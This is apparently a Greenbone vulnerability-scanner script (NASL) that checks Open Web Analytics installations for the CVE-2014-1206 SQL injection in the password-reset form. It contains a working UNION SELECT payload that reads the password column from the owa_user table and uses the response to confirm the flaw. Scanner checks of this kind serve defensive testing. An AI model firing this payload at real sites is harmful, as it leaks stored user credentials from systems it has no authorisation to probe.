# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:openwebanalytics:open_web_analytics";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803795");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2014-01-21 13:34:38 +0530 (Tue, 21 Jan 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2014-1206");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Open Web Analytics < 1.5.5 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_open_web_analytics_http_detect.nasl");
  script_mandatory_keys("open_web_analytics/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Open Web Analytics is prone to an SQL injection (SQLi)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'owa_email_address' parameter to index.php
  (when 'owa_do' is set to 'base.passwordResetForm' and 'owa_action' is set to
  'base.passwordResetRequest') is not properly sanitised before being used in a SQL query.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to manipulate SQL
  queries in the back-end database, allowing for the manipulation or disclosure of arbitrary
  data.");

  script_tag(name:"affected", value:"Open Web Analytics version 1.5.4 and prior.");

  script_tag(name:"solution", value:"Update to version 1.5.5 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/56350");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64774");
  script_xref(name:"URL", value:"http://www.secureworks.com/advisories/SWRX-2014-001/SWRX-2014-001.pdf");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?owa_do=base.passwordResetForm";
header = make_array("Content-Type", "application/x-www-form-urlencoded");
data = "owa_submit=Request+New+Password&owa_action=base.password" +
       "ResetRequest&owa_email_address=-4534' UNION ALL SELECT 3" +
       "627,3627,3627,3627,3627,CONCAT(0x7177766871,0x73716c2d69" +
       "6e6a2d74657374, IFNULL(CAST(password AS CHAR),0x20),0x71" +
       "76627971),3627,3627,3627,3627 FROM owa.owa_user LIMIT 0,1#";

req = http_post_put_req(port: port, url: url, data: data, add_headers: header);
res = http_keepalive_send_recv(port: port, data: req);

if (res && res =~ "Invalid address:.*sql-inj-test") {
  report = 'It was possible to conduct an SQL injection attack.\n\nResult:\n\n' + chomp(res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
